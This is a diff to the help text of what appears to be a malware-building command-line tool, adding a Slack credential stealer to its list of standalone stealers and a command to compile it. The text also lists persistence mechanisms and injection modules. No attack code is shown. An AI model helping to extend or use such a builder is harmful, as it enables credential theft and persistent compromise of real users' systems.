@@ -1532,7 +1532,7 @@ the CLI builder (the dashboard handles them separately).
 
     list windows       -- only Windows/MingW modules
     list linux         -- only Linux/GCC modules
-    list stealer       -- standalone stealers (angelcam, azure, bitbucket, github, telegram, virustotal)
+    list stealer       -- standalone stealers (angelcam, azure, bitbucket, github, slack, telegram, virustotal)
     list persistence   -- persistence mechanisms (registry_run, screensaver, filetype_hijack, winlogon)
     list injection     -- only modules in the injection category
 
@@ -1541,6 +1541,7 @@ the CLI builder (the dashboard handles them separately).
     list stealer                    -- browse available stealers
     build virustotal                -- compile virustotal stealer (prompts for persistence)
     build telegram                  -- compile telegram stealer
+    build slack                     -- compile slack stealer
     list persistence                -- see all persistence options
     search lazarus                  -- search meow modules + stealers for lazarus
     history 10                      -- last 10 builds
@@ -1575,7 +1576,7 @@ Show a paginated table of compilable modules, with optional filter.
 
 - 20 entries per page; press **Enter** to advance
 - Modules marked non-compilable (nasm, nim) are excluded
-- `list stealer` shows the 6 standalone stealers from `malware/stealer/`
+- `list stealer` shows the 7 standalone stealers from `malware/stealer/`
 - `list persistence` shows the 4 persistence mechanisms from `malware/persistence/`
 - Use `build <slug>` or `build <stealer-name>` to compile
 """,
